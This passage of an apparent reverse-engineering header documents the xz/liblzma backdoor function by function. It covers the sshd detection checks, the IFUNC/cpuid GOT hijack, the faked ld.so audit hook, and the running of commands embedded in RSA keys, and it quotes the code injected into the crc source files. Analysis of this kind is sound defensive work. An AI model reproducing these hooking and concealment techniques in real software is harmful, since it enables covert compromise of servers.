 * @brief finds a MOV instruction.
 *
 * @p load_flag specifies if the desired MOV should be a load:
 * @code mov reg, [mem] @endcode
 * or a store
 * @code mov [mem], reg @endcode
 * 
 * @param code_start address to start searching from
 * @param code_end address to stop searching at
 * @param is_64bit_operand TRUE if MOV should have a 64bit operand, FALSE otherwise
 * @param load_flag TRUE if searching for load, FALSE for a store
 * @param dctx disassembler context to hold the state 
 * @return BOOL TRUE if found, FALSE otherwise
 */
extern BOOL find_mov_instruction(
	u8 *code_start,
	u8 *code_end,
	BOOL is_64bit_operand,
	BOOL load_flag,
	dasm_ctx_t *dctx
);

/**
 * @brief finds an instruction with an immediate memory operand
 * 
 * @param code_start address to start searching from
 * @param code_end address to stop searching at
 * @param dctx disassembler context to hold the state
 * @param opcode opcode to look for, in encoded form (+0x80)
 * @param mem_address the expected address of the memory access
 * @return BOOL TRUE if found, FALSE otherwise
 */
extern BOOL find_instruction_with_mem_operand_ex(
	u8 *code_start,
	u8 *code_end,
	dasm_ctx_t *dctx,
	int opcode,
	void *mem_address
);

/**
 * @brief Checks if the code between @p code_start and @p code_end is an endbr64 instruction.
 *
 *
 * the checks is encoded as following (note: An endbr64 instruction is encoded as <code>F3 0F 1E FA</code>)
 * @code
 * // as 32bit quantities, so 0x10000f223 -> f223
 * (0xFA1E0FF3 + (0xE230 | 0x5E20000)) == 0xF223
 * @endcode
 * and 0xE230 is always passed as an argument to prevent compiler optimizations and for further obfuscation.
 *
 * @param code_start pointer to the first byte of the instruction to test
 * @param code_end pointer to the last byte of the instruction to test
 * @param low_mask_part the constant 0xE230
 * @return BOOL TRUE if the instruction is an endbr64, FALSE otherwise
 */
extern BOOL is_endbr64_instruction(u8 *code_start, u8 *code_end, u32 low_mask_part);

/**
 * @brief finds an instruction that references the given string
 * 
 * @param code_start address to start searching from
 * @param code_end address to stop searching at
 * @param str the target of the string reference (i.e. the target of the LEA instruction)
 * @return u8* the address of the first instruction that references the given string, or NULL if not found
 */
extern u8 *find_string_reference(
	u8 *code_start,
	u8 *code_end,
	const char *str
);

/**
 * @brief finds an instruction that references the given string
 * 
 * @param elf_info the parsed ELF context
 * @param encoded_string_id the string to search for, in encoded form
 * @param code_start address to start searching from
 * @param code_end address to stop searching at
 * @return u8* the address of the first instruction that references the given string, or NULL if not found
 */
extern u8 *elf_find_string_reference(
	elf_info_t *elf_info,
	EncodedStringId encoded_string_id,
	u8 *code_start,
	u8 *code_end
);

/**
 * @brief finds a reg2reg instruction
 *
 * a reg2reg instruction is an x64 instruction with one of the following characteristics:
 * - a primary opcode of 0x89 (MOV/JNS)
 * or, alternatively, passing the following filter:
 * - ((0x505050500000505uLL >> (((dctx->opcode) & 0xFF) + 0x7F)) & 1) != 0
 * NOTE: the opcode in 'dctx->opcode' is the actual opcode +0x80 
 * TODO: inspect x64 manual to find the exact filter
 *
 * the instruction must also satisfy the following conditions:
 * - NOT have REX.B and REX.R set (no extension bits)
 * - MODRM.mod must be 3 (register-direct addressing mode)
 * 
 * @param code_start address to start searching from
 * @param code_end address to stop searching at
 * @param dctx disassembler context to hold the state
 * @return BOOL TRUE if found, FALSE otherwise
 */
extern BOOL find_reg2reg_instruction(u8 *code_start, u8 *code_end, dasm_ctx_t *dctx);

/**
 * @brief locates the function prologue
 * 
 * @param code_start address to start searching from
 * @param code_end address to stop searching at
 * @param output pointer to receive the resulting prologue address, if found
 * @param find_mode prologue search mode/strategy
 * @return BOOL TRUE if found, FALSE otherwise
 */
extern BOOL find_function_prologue(u8 *code_start, u8 *code_end, u8 **output, FuncFindType find_mode);

/**
 * @brief locates the function boundaries.
 * 
 * @param code_start address to start searching from
 * @param func_start if provided, will be filled with the function's start address
 * @param func_end if provided, will be filled with the function's end address
 * @param search_base lowest search address, where search will be aborted
 * @param code_end address to stop searching at
 * @param find_mode 
 * @return BOOL 
 */
extern BOOL find_function(
	u8 *code_start,
	void **func_start,
	void **func_end,
	u8 *search_base,
	u8 *code_end,
	FuncFindType find_mode);

/**
 * @brief checks if given ELF file contains the range [vaddr, vaddr+size)
 * in a segment with the specified memory protection flags
 * 
 * @param elf_info elf context
 * @param vaddr starting memory address
 * @param size memory size
 * @param p_flags the expected segment protection flags (PF_*)
 * @return BOOL TRUE if found, FALSE otherwise
 */
extern BOOL elf_contains_vaddr(elf_info_t *elf_info, u64 vaddr, u64 size, u32 p_flags);

/**
 * @brief Parses the given in-memory ELF file into elf_info
 * 
 * @param ehdr pointer to the beginning of the ELF header
 * @param elf_info pointer to the structure that will hold the parsed information
 * @return BOOL TRUE if parsing completed successfully, FALSE otherwise
 */
extern BOOL elf_parse(Elf64_Ehdr *ehdr, elf_info_t *elf_info);

/**
 * @brief Parses the main executable from the provided structure.
 * As part of the process the arguments and environment is checked.
 * 
 * The main_elf_t::dynamic_linker_ehdr is set in backdoor_setup() by an interesting trick where the address of __tls_get_addr()
 * is found via GOT in update_got_address(). Then a backwards search for the ELF header magic bytes from this address is
 * performed to find the ld.so ELF header.
 *
 * The function will succeed if the checks outlined in @ref process_is_sshd (invoked by this function) are successful.
 *
 * @param main_elf The main executable to parse.
 * @return BOOL TRUE if successful and all checks passed, or FALSE otherwise.
 */
extern BOOL main_elf_parse(main_elf_t *main_elf);

extern char *check_argument(char arg_first_char, char* arg_name);

/**
 * @brief checks if the current process is sshd by inspecting `argv` and `envp`.
 *
 * this is done by reading the top of the process stack ( represented by @p stack_end )
 *
 * The following checks are performed:
 * - that argv[0] is "/usr/sbin/sshd"
 * - the remaining args all start with '-'
 * - the args do not contain the '-d' or '-D' flags (which set sshd into debug or non-daemon mode)
 * - that there is not any '\\t' or '=' characters in the args
 * - the environment variable strings do not start with any string from the encoded string table
 * 
 * In particular these environment strings:
 * - "DISPLAY="
 * - "LD_AUDIT="
 * - "LD_BIND_NOT="
 * - "LD_DEBUG="
 * - "LD_PROFILE="
 * - "LD_USE_LOAD_BIAS="
 * - "LINES="
 * - "TERM="
 * - "WAYLAND_DISPLAY="
 * - "yolAbejyiejuvnup=Evjtgvsh5okmkAvj" 
 * 
 * @param elf the main ELF context
 * @param stack_end pointer to the top of the process stack, also known as `__libc_stack_end`
 * @return BOOL TRUE if the process is `sshd`, FALSE otherwise
 */
extern BOOL process_is_sshd(elf_info_t *elf, u8 *stack_end);

/**
 * @brief parses the ELF rodata section, looking for strings and the instructions that reference them
 * 
 * @param elf_info the executable to find strings in
 * @param refs structure that will be populated with the results
 * @return BOOL 
 */
extern void elf_find_string_references(elf_info_t *elf_info, string_references_t *refs);

/**
 * @brief Looks up an ELF symbol from a parsed ELF
 * 
 * @param elf_info the parsed ELF context
 * @param encoded_string_id string ID of the symbol name
 * @param sym_version optional string representing the symbol version (e.g. "GLIBC_2.2.5")
 * @return Elf64_Sym* pointer to the ELF symbol, or NULL if not found
 */
extern Elf64_Sym *elf_symbol_get(elf_info_t *elf_info, EncodedStringId encoded_string_id, EncodedStringId sym_version);

/**
 * @brief Looks up an ELF symbol from a parsed ELF, and returns its memory address
 * 
 * @param elf_info the parsed ELF context
 * @param encoded_string_id string ID of the symbol name
 * @return void* the address of the symbol
 */
extern void *elf_symbol_get_addr(elf_info_t *elf_info, EncodedStringId encoded_string_id);

/**
 * @brief Obtains the address and size of the first executable segment in the given ELF file
 * 
 * @param elf_info the parsed ELF context, which will be updated with the address and size of the code segment
 * @param pSize variable that will be populated with the page-aligned segment size
 * @return void* the page-aligned starting address of the segment
 */
extern void *elf_get_code_segment(elf_info_t *elf_info, u64 *pSize);

/**
 * @brief Obtains the address and size of the last readonly segment in the given ELF file
 * this corresponds to the segment that typically contains .rodata
 * 
 * @param elf_info the parsed ELF context, which will be updated with the address and size of the rodata segment
 * @param pSize variable that will be populated with the page-aligned segment size
 * @return void* the page-aligned starting address of the segment
 */
extern void *elf_get_rodata_segment(elf_info_t *elf_info, u64 *pSize);

/**
 * @brief Obtains the address and size of the last read-write segment in the given ELF file
 * this is typically the segment that contains the following sections:
 * - .init_array .fini_array .data.rel.ro .dynamic .got
 * 
 * the parameter @p get_alignment controls if @p pSize should be populated with the segment size (when FALSE),
 * or with the segment alignment (when TRUE)
 * 
 * Used to store data in the free space after the segment created due to alignment:
 * - for liblzma at (return value + 0x10) is the backdoor_hooks_data_t struct pointed to by hooks_data_addr
 *
 * @param elf_info the parsed ELF context, which will be updated with the address and size of the data segment
 * @param pSize variable that will be populated with either the page-aligned segment size, or the alignment size
 * @param get_alignment controls if alignment size should be returned instead of segment size
 * @return void* the page-aligned starting address of the segment
 */
extern void *elf_get_data_segment(elf_info_t *elf_info, u64 *pSize, BOOL get_alignment);

/**
 * @brief Searches the ELF relocations for a symbol having name @p encoded_string id
 * and relocation of type @p reloc_type
 * 
 * @param elf_info the parsed ELF context
 * @param relocs array of relocations to search in
 * @param num_relocs number of items in the array pointed by @p relocs
 * @param reloc_type type of relocation to consider (R_X86_64_*)
 * @param encoded_string_id symbol to look for (encoded)
 * @return void* the address of the symbol, or NULL if not found
 */
extern void *elf_get_reloc_symbol(
	elf_info_t *elf_info,
	Elf64_Rela *relocs,
	u32 num_relocs,
	u64 reloc_type,
	EncodedStringId encoded_string_id);

/**
 * @brief Gets the PLT symbol with name @p encoded_string_id from the parsed ELF file
 * 
 * @param elf_info the parsed ELF context
 * @param encoded_string_id symbol to look for (encoded)
 * @return void* the address of the symbol, or NULL if not found
 */
extern void *elf_get_plt_symbol(elf_info_t *elf_info, EncodedStringId encoded_string_id);

/**
 * @brief Gets the GOT symbol with name @p encoded_string_id from the parsed ELF file
 * 
 * @param elf_info the parsed ELF context
 * @param encoded_string_id symbol to look for (encoded)
 * @return void* the address of the symbol, or NULL if not found
 */
extern void *elf_get_got_symbol(elf_info_t *elf_info, EncodedStringId encoded_string_id);

/**
 * @brief this function searches for a function pointer, pointing to a function
 * designated by the given @p xref_id
 * 
 * @param xref_id the index to use to retrieve the function from @p xrefs
 * @param pOutCodeStart output variable that will receive the function start address
 * @param pOutCodeEnd output variable that will receive the function end address
 * @param pOutFptrAddr output variable that will receive the address of the function pointer
 * @param elf_info sshd elf context
 * @param xrefs array of resolved functions, filled by @ref elf_find_string_references
 * @param ctx the global context. used to retrieve the 'uses_endbr64' field
 * @return BOOL TRUE if the function pointer was found, FALSE otherwise
 */
extern BOOL elf_find_function_pointer(
	StringXrefId xref_id,
	void **pOutCodeStart, void **pOutCodeEnd,
	void **pOutFptrAddr, elf_info_t *elf_info,
	string_references_t *xrefs,
	global_context_t *ctx);

/**
 * @brief Locates a string in the ELF .rodata section
 * 
 * @param elf_info the ELF context to use for the search
 * @param stringId_inOut mandatory pointer to an encoded string ID.
 * - if the referenced string ID is 0, the first matching string (in the string table) will stop the search,
 * and the matching string ID will be written to the pointer.
 * - if the referenced string ID is not 0, the search will look for that specific string ID,
 * and the value will not be updated.
 * @param rodata_start_ptr location in the rodata section to start the search from
 * @return char* pointer to the string, or NULL if it couldn't be found
 */
extern char *elf_find_string(
	elf_info_t *elf_info,
	EncodedStringId *stringId_inOut,
	void *rodata_start_ptr);

/**
 * @brief gets the fake LZMA allocator, used for imports resolution
 * the "opaque" field of the structure holds a pointer to @see elf_info_t
 * 
 * @return lzma_allocator* 
 */
extern lzma_allocator *get_lzma_allocator();

/**
 * @brief gets the address of the fake LZMA allocator
 * 
 * uses fake_lzma_allocator_offset to get the address 0x180 bytes before fake_lzma_allocator
 * and then adds 0x160 to get the final address of fake_lzma_allocator
 * 
 * called in get_lzma_allocator()
 * 
 * @return fake_lzma_allocator_t*
 */
extern fake_lzma_allocator_t *get_lzma_allocator_address();

/**
 * @brief a fake alloc function called by lzma_alloc() that then calls elf_symbol_get_addr()
 * 
 * @param opaque the parsed ELF context (elf_info_t*)
 * @param nmemb not used
 * @param size string ID of the symbol name (EncodedStringId)
 * @return void* the address of the symbol
 */
extern void *fake_lzma_alloc(void *opaque, size_t nmemb, size_t size);

/**
 * @brief a fake free function called by lzma_free()
 * 
 * this function is a red herring as it is does nothing except make it look like lzma_alloc() is the real deal
 * 
 * @param opaque not used
 * @param ptr not used
 */
extern void fake_lzma_free(void *opaque, void *ptr);

/**
 * @brief gets the address of the elf_functions
 * 
 * uses elf_functions_offset to get the address 0x2a0 bytes before elf_functions
 * and then adds 0x268 to get the final address of elf_functions
 *  * 
 * @return elf_functions_t* 
 */
extern elf_functions_t *get_elf_functions_address();

extern BOOL secret_data_append_from_instruction(dasm_ctx_t *dctx, secret_data_shift_cursor_t *cursor);

/**
 * @brief Pushes secret data by validating the given code block
 * 
 * @param code_start pointer to the beginning of code/function to analyze
 * @param code_end pointer to the end of code/function to analyze
 * @param shift_cursor shift index
 * @param shift_count how many '1' bits to shift
 * @param start_from_call TRUE if analysis should begin from the first CALL instruction
 * FALSE to start from the first instruction
 * @return BOOL TRUE if all requested shifts were all executed.
 * FALSE if some shift wasn't executed due to code validation failure.
 */
extern BOOL secret_data_append_from_code(
	void *code_start,
	void *code_end,
	secret_data_shift_cursor_t shift_cursor,
	unsigned shift_count, BOOL start_from_call);

/**
 * @brief Calls @ref secret_data_append_singleton, if @p flags are non-zero
 *
 * @param shift_cursor the initial shift index
 * @param operation_index identification for this shift operation
 * @param shift_count how many '1' bits to shift
 * @param flags must be non-zero in order for the operation to be executed
 * @param code pointer to code that will be checked by the function, to "authorize" the data load
 * @return BOOL TRUE if validation was successful and data was added, FALSE otherwise
 */
extern BOOL secret_data_append_if_flags(
	secret_data_shift_cursor_t shift_cursor,
	unsigned operation_index,
	unsigned shift_count,
	int flags, u8 *code);

/**
 * @brief calls @ref secret_data_append_singleton
 * with either the given code address or the return address, if @p addr is <= 1
 * 
 * @param addr the code address to use for the verification. NULL to use the return address
 * @param shift_cursor the initial shift index
 * @param shift_count how many '1' bits to shift
 * @param operation_index identification for this shift operation
 * @return BOOL 
 */
extern BOOL secret_data_append_from_address(
	void *addr,
	secret_data_shift_cursor_t shift_cursor,
	unsigned shift_count, unsigned operation_index);

/**
 * @brief Shifts data in the secret data store, after validation of @p code.
 * this function is intended to be invoked only once for each @p operation_index value.
 * @p operation_index will be used as an index into a global array of flags,
 * so that multiple calls with the same value will be a NO-OP.
 * 
 * the @p code will be verified to check if the shift operation should be allowed or not.
 * the algorithm will:
 * - locate the beginning of the function, by scanning for the `endbr64` instruction
 *    and making sure that the code lies between a pre-defined code range (set in @ref backdoor_setup from @ref elf_get_code_segment)
 * - search for @p shift_count number of "reg2reg" instructions (explained below)
 * - for each instruction, shift a '1' in the data register, and increment the shift cursor to the next bit index
 * the code only considers reg2reg instruction. other instructions are skipped.
 * the function will return TRUE if the number of shifts executed == number of wanted shifts
 * (that is, if there are as many compatible reg2reg instructions as the number of requested shifts)
 * NOTE: MOV instructions are counted, but don't cause any shift (they are skipped).
 *
 * a reg2reg instruction is an x64 instruction with one of the following characteristics:
 * - primary opcode of 0x89 (MOV) or 0x3B (CMP)
 * or, alternatively, an opcode that passes the following validation
 *  opcode_check = opcode - 0x83;
 *  if ( opcode_check > 0x2E || ((0x410100000101 >> opcode_value) & 1) == 0 )
 *
 * additionally, checks outlined in @ref find_reg2reg_instruction must also pass
 * NOTE: the opcode in 'opcode' is the actual opcode +0x80 
 * TODO: inspect x64 manual to find the exact filter
 *
 * if @p call_site is supplied, a preliminary check will be conducted to see if the caller function
 * contains a CALL-relative instruction.
 * several functions have a CALL in the prologue which serves a dual purpose:
 * - push more data in the secret data store
 * - check if the call is authorized (the code is in the authorized range, and starts with a CALL-relative instruction)
 *
 *
 * @param call_site if supplied, it will be checked if it contains a valid CALL-relative instruction
 * @param code pointer to code that will be checked by the function, to "authorize" the data load
 * @param shift_cursor the initial shift index
 * @param shift_count number of '1' bits to shift, represented by the number of"reg2reg" instructions expected in the function pointed to by @p code
 * @param operation_index index/id of shit shift operation
 * @return BOOL TRUE if all requested shifts were all executed.
 * FALSE if some shift wasn't executed due to code validation failure.
 */
extern BOOL secret_data_append_singleton(
	u8 *call_site, u8 *code,
	secret_data_shift_cursor_t shift_cursor,
	unsigned shift_count, unsigned operation_index);

/**
 * @brief Shifts data in the secret data store, after validation of the call site,
 * i.e. the caller of this function
 * for more details, see @ref secret_data_append_singleton
 * 
 * @param shift_cursor the initial shift index
 * @param shift_count number of '1' bits to shift
 * @param operation_index index/id of shit shift operation
 * @param bypass forces the result to be TRUE, evne if validation failed
 * @return BOOL TRUE if validation was successful and data was added, FALSE otherwise
 */
extern BOOL secret_data_append_from_call_site(
	secret_data_shift_cursor_t shift_cursor,
	unsigned shift_count, unsigned operation_index,
	BOOL bypass
);

/**
 * @brief the backdoor main method that installs the backdoor_symbind64() callback
 * 
 * If the backdoor initialization steps are successful the final step modifies some ld.so private structures
 * to simulate a LD_AUDIT library and install the backdoor_symbind64() as a symbind callback.
 * 
 * To pass the various conditions in ld.so's _dl_audit_symbind_alt the following fields are modified:
 * - the sshd and libcrypto struct link_map::l_audit_any_plt flag is set to 1
 * - the sshd struct auditstate::bindflags is set to LA_FLG_BINDFROM
 * - the libcrypto struct auditstate::bindflags is set to LA_FLG_BINDTO
 * - _rtld_global_ro::_dl_audit is set to point to ldso_ctx_t::hooked_audit_iface
 * - the struct audit_ifaces::symbind64 is set to backdoor_symbind64()
 * - _rtld_global_ro::_dl_naudit is set to 1
 * 
 * After the modifications backdoor_symbind64() will be called for all symbol bindings from sshd to libcrypto.
 * 
 * @param params parameters from backdoor_init_stage()
 * @return BOOL unused, always return FALSE
 */
extern BOOL backdoor_setup(backdoor_setup_params_t *params);

/**
 * @brief calls @ref backdoor_init while in the crc64() IFUNC resolver function
 * 
 * the function counts the number of times it was called in resolver_call_count
 * 
 * the first time it is called is in the crc32() resolver just returns the maximum supported cpuid level
 * 
 * the second time it is called is in the crc64() resolver and then this function calls backdoor_init_stage2()
 * 
 * this is a modified version of __get_cpuid_max() from gcc
 * 
 * backdoor_init_stage2() is called by replacing the _cpuid() GOT entry to point to backdoor_init_stage2()
 * 
 * @param cpuid_request EAX register input. Is either 0 or 0x80000000, but this value is actually not used.
 * @param caller_frame the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver
 * @return unsigned int the EAX register output. Normally the maximum supported cpuid level.
 */
extern unsigned int backdoor_entry(unsigned int cpuid_request, u64 *caller_frame);

/**
 * @brief calls @ref backdoor_init_stage2 by disguising it as a call to cpuid.
 *
 * @ref backdoor_init_stage2 is called by replacing the _cpuid() GOT entry to point to @ref backdoor_init_stage2
 * 
 * stores elf_entry_ctx_t::symbol_ptr - elf_entry_ctx_t::got_offset in elf_entry_ctx_t::got_ptr which is the GOT address .
 * 
 * @param state the entry context, filled by @ref backdoor_entry
 * @param caller_frame the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver
 * @return void* the value elf_entry_ctx_t::got_ptr if the cpuid() GOT entry was NULL, otherwise the return value of backdoor_init_stage2()
 */
extern void * backdoor_init(elf_entry_ctx_t *state, u64 *caller_frame);

/**
 * @brief initialises the elf_entry_ctx_t
 * 
 * stores the address of the symbol cpuid_random_symbol in elf_entry_ctx_t::symbol_ptr
 * stores the return address of the function that called the IFUNC resolver which is a stack address in ld.so
 * calls get_got_offset() to update elf_entry_ctx_t::got_offset 
 * calls get_cpuid_got_index() to update elf_entry_ctx_t::cpuid_fn
 * 
 * @param ctx
 * @return ptrdiff_t always 0
 */
extern ptrdiff_t init_elf_entry_ctx(elf_entry_ctx_t *ctx);

/**
 * @brief get the offset to the GOT
 * 
 * the offset is relative to the address of the symbol cpuid_random_symbol
 * 
 * stores the offset in elf_entry_ctx_t::got_offset
 * 
 * @param ctx
 * @return ptrdiff_t offset to GOT from the symbol cpuid_random_symbol
 */
extern ptrdiff_t get_got_offset(elf_entry_ctx_t *ctx);

/**
 * @brief get the cpuid() GOT index
 * 
 * stores the index in elf_entry_ctx_t::cpuid_fn
 * 
 * @param ctx
 * @return u64 cpuid() GOT index
 */
extern u64 get_cpuid_got_index(elf_entry_ctx_t *ctx);

/**
 * @brief
 * 
 * @param ctx holds values needed to setup the _cpuid(), passed to backdoor_init_stage2()
 * @param caller_frame stores the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver
 * @param cpuid_got_addr address of the cpuid() GOT entry
 * @param reloc_consts pointer to cpuid_reloc_consts
 * @return BOOL the value elf_entry_ctx_t::got_ptr if the cpuid() GOT entry was NULL, otherwise the return value of backdoor_init_stage2()
 */
extern BOOL backdoor_init_stage2(elf_entry_ctx_t *ctx, u64 *caller_frame, void **cpuid_got_addr, backdoor_cpuid_reloc_consts_t* reloc_consts);

/**
 * @brief parses the libc ELF from the supplied link map, and resolves its imports
 * 
 * @param libc the loaded libc's link map (obtained by traversing r_debug->r_map)
 * @param libc_info pointer to an ELF context that will be populated with the parsed ELF information
 * @param imports pointer to libc imports that will be populated with resolved libc function pointers
 * @return BOOL TRUE if successful, FALSE otherwise
 */
extern BOOL resolve_libc_imports(
	struct link_map *libc,
	elf_info_t *libc_info,
	libc_imports_t *imports
);

/**
 * @brief scans loaded libraries to identify interesting libraries
 * 
 * @param data input data for the function (will be duplicated, internally)
 * @return BOOL TRUE if successful, FALSE otherwise
 */
extern BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data);

/**
 * @brief scans loaded libraries to identify interesting libraries and populate related data
 * 
 * @param r_map the linked list of loaded libraries obtained from `r_debug`
 * @param data pointer to data that will be populated by the function
 * @return BOOL TRUE if successful, FALSE otherwise
 */
extern BOOL process_shared_libraries_map(struct link_map *r_map, backdoor_shared_libraries_data_t *data);

/**
 * @brief decrypts a buffer with chacha20
 * 
 * @param in the input buffer to decrypt
 * @param inl the length of the input buffer
 * @param key the 256bit chacha key
 * @param iv the 128bit chacha iv
 * @param out the output buffer
 * @param funcs OpenSSL imported functions
 * @return BOOL TRUE if successful, FALSE otherwise
 */
extern BOOL chacha_decrypt(
	u8 *in, int inl,
	u8 *key, u8 *iv,
	u8 *out, imported_funcs_t *funcs
);

/**
 * @brief obtains a decrypted copy of the secret data
 * 
 * @param output output buffer that will receive the decrypted data
 * @param ctx the global context (for secret data and function imports)
 * @return BOOL TRUE if successful, FALSE otherwise
 */
extern BOOL secret_data_get_decrypted(u8 *output, global_context_t *ctx);

/**
 * @brief verify if a memory range is mapped
 * 
 * @param addr the start address
 * @param length the length of the range to check
 * @param ctx a structure with a libc_import_t field at offset 0x10
 * @return BOOL TRUE if the whole range is mapped, FALSE otherwise
 */
extern BOOL is_range_mapped(u8* addr, u64 length, global_context_t* ctx);

/**
 * @brief returns the number of 1 bits in x
 * 
 * @param x 
 * @return u32 number of 1 bits
 */
extern u32 count_bits(u64 x);

/**
 * @brief Get the @see EncodedStringId for the given string
 * the string will be consumed until one of the following condition is reached (whichever happens first):
 * - 44 chars have been consumed (maximum string length)
 * - @p string_end is supplied and has been reached
 * - the string table has been exhausted
 * 
 * @param string_begin the string to get the ID for (max 44 chars)
 * @param string_end optional string end pointer
 * @return EncodedStringId the string ID matching the input string, or 0 if not found
 */
extern EncodedStringId get_string_id(const char *string_begin, const char *string_end);

/**
 * @brief the backdoor entrypoint function, called by the IFUNC resolver for liblzma crc32() and crc64()
 * 
 * calls backdoor_init()
 * 
 * this is a copy of __get_cpuid() from gcc
 * 
 * for context this is the extra code the backdoor build inserts into both xz/src/liblzma/check/crc32_fast.c and xz/src/liblzma/check/crc64_fast.c
 * \code{.c}
 * #if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))
 * int _get_cpuid(int, void*, void*, void*, void*, void*);
 *
 * static inline bool _is_arch_extension_supported(void) {
 *   int success = 1;
 *   uint32_t r[4];
 *   success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16);
 *   const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19);
 *   return success && (r[2] & ecx_mask) == ecx_mask;
 * }
 * 
 * #else
 * #define _is_arch_extension_supported() is_arch_extension_supported
 * #endif 
 * \endcode
 * 
 * the _get_cpuid() function is defined in the file liblzma_la-crc64-fast.o which is linked into liblzma to bring in the backdoor's code
 * 
 * the _is_arch_extension_supported is a modified version of is_arch_extension_supported() from xz/src/liblzma/check/crc_x86_clmul.h
 * 
 * additionally both xz/src/liblzma/check/crc32_fast.c and xz/src/liblzma/check/crc64_fast.c are modified to replace the call to is_arch_extension_supported() with _is_arch_extension_supported()
 * 
 * @param leaf EAX register input for cpuid instruction
 * @param eax EAX register output for cpuid instruction
 * @param ebx EBX register output for cpuid instruction
 * @param ecx ECX register output for cpuid instruction
 * @param edx EDX register output for cpuid instruction
 * @param caller_frame the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver
 * @return BOOL TRUE if cpuid leaf supported, FALSE otherwise
 */
extern unsigned int _get_cpuid_modified(unsigned int leaf, unsigned int *eax, unsigned int *ebx,  unsigned int *ecx, unsigned int *edx, u64 *caller_frame);

/**
 * @brief actually calls cpuid instruction
 * 
 * this is a copy of __cpuid() from gcc
 * 
 * @param level EAX register input for cpuid instruction
 * @param a EAX register output for cpuid instruction
 * @param b EBX register output for cpuid instruction
 * @param c ECX register output for cpuid instruction
 * @param d EDX register output for cpuid instruction
 */
extern void _cpuid_gcc(unsigned int level, unsigned int *a, unsigned int *b,  unsigned int *c, unsigned int *d);

/**
 * @brief Initializes the structure with hooks-related data
 * 
 * Grabs the call addresses of the internal functions that will be installed into the hook locations.
 * 
 * @param funcs 
 * @return int 
 */
extern int init_hook_functions(backdoor_hooks_ctx_t *funcs);

/**
 * @brief finds the __tls_get_addr() GOT entry
 * 
 * this function first computes the location of the __tls_get_addr() PLT trampoline function by using
 * the PLT offset constant from tls_get_addr_reloc_consts
 * 
 * then it decodes the PLT jmp instruction to get the address of the __tls_get_addr() GOT entry
 * 
 * the __tls_get_addr() GOT entry is used in backdoor_setup() to find the ELF header at the start of the memory mapped ld.so
 * 
 * calls get_tls_get_addr_random_symbol_got_offset() to update elf_entry_ctx_t::got_ptr and elf_entry_ctx_t::got_offset
 * sets elf_entry_ctx_t::got_offset = 0
 * sets elf_entry_ctx_t::cpuid_fn = 0
 * stores the address of the __tls_get_addr() GOT entry in  elf_entry_ctx_t::got_ptr
 * 
 * @param entry_ctx 
 * @return void* the address of the __tls_get_addr() GOT entry
 */
extern void *update_got_address(elf_entry_ctx_t *entry_ctx);

/**
 * @brief get the tls_get_addr_random_symbol GOT offset
 * 
 * sets elf_entry_ctx_t::got_ptr = 0x2600
 * stores the index in elf_entry_ctx_t::got_offset
 * 
 * @param ctx
 * @return ptrdiff_t tls_get_addr_random_symbol GOT offset
 */
extern ptrdiff_t get_tls_get_addr_random_symbol_got_offset(elf_entry_ctx_t *ctx);

/**
 * @brief the backdoored symbind64 installed in GLRO(dl_audit)
 * 
 * @param sym 
 * @param ndx 
 * @param refcook 
 * @param defcook 
 * @param flags 
 * @param symname 
 * @return uintptr_t 
 */
extern uintptr_t backdoor_symbind64(
	Elf64_Sym *sym,
	unsigned int ndx,
	uptr *refcook, uptr *defcook,
	unsigned int flags,
	const char *symname);

/**
 * @brief checks if the supplied RSA public key contains the backdoor commands, and executes them if present.
 *
 * this function is called from function hooks. the output parameter @p do_orig
 * will indicate to the caller if the original function should be invoked or not
 * 
 * @param key the public RSA key to check
 * @param ctx the global context, used for the secret data (chacha key)
 * @param do_orig output variable. will contain TRUE if the original function should be invoked, FALSE otherwise.
 * @return BOOL TRUE if backdoor commands were invoked, FALSE otherwise
 */
extern BOOL run_backdoor_commands(RSA *key, global_context_t *ctx, BOOL *do_orig);

/**
 * @brief Find the various offsets in ld.so that need modification to trigger _dl_audit_symbind_alt() to call backdoor_symbind64().
 * 
 * First, this function finds the location and size of ld.so's _dl_audit_symbind_alt().
 * 
 * This function then calls find_link_map_l_name(), find_dl_naudit() and find_link_map_l_audit_any_plt() to get the various offsets required to modify ld.so's private audit state
 * so that _dl_audit_symbind_alt() will call backdoor_symbind64().
 * 
 * @param data 
 * @param libname_offset output of the offset from the start of the link_map to the location directly after where the link_map::l_name string data is stored
 * @param hooks 
 * @param imported_funcs 
 * @return BOOL TRUE if successful, FALSE otherwise 
 */
extern BOOL find_dl_audit_offsets(
	backdoor_data_handle_t *data,
	ptrdiff_t *libname_offset,
	backdoor_hooks_data_t *hooks,
	imported_funcs_t *imported_funcs);

/**
 * @brief Find struct link_map offsets required to modify ld.so's private struct auditstate state.
 * 
 * This function inspects ld.so's private struct link_map for liblzma.
 *
 * First, this function finds the end of the link_map by searching for the private link_map::l_relro_addr and
 * link_map::l_relro_size with values that match liblzma's elf_info_t::gnurelro_vaddr and elf_info_t::gnurelro_memsize respectively.
 * 
 * This function then calculates libname_offset by searching for linkmap::l_name which points to a string stored just after the link_map by ld.so's _dl_new_object().
 * 
 * This function then sets ldso_ctx::libcrypto_l_name to the location of link_map::l_name for the libcrypto link_map.
 * 
 * This function disassembles ld.so's _dl_audit_preinit() and _dl_audit_symbind_alt() to verify both contain a LEA instruction with an offset that matches libname_offset.
 *  
 * This function also resolves a number of libc and libcrypto function addresses.
 * 
 * @param data_handle 
 * @param libname_offset output of the offset from the start of the link_map to the location directly after where the link_map::l_name string data is stored
 * @param hooks 
 * @param imported_funcs 
 * @return BOOL TRUE if successful, FALSE otherwise 
 */
extern BOOL find_link_map_l_name(
	backdoor_data_handle_t *data_handle,
	ptrdiff_t *libname_offset,
	backdoor_hooks_data_t *hooks,
	imported_funcs_t *imported_funcs);

/**
 * @brief Find __rtld_global_ro offsets required to modify ld.so's private struct audit_ifaces state.
 * 
 * First, this function disassembles ld.so to search for the assert(GLRO(dl_naudit) <= naudit) from _dl_main().
 * This assert has a LEA instruction with an offset to ld.so's __rtld_global_ro::_dl_naudit.
 *  
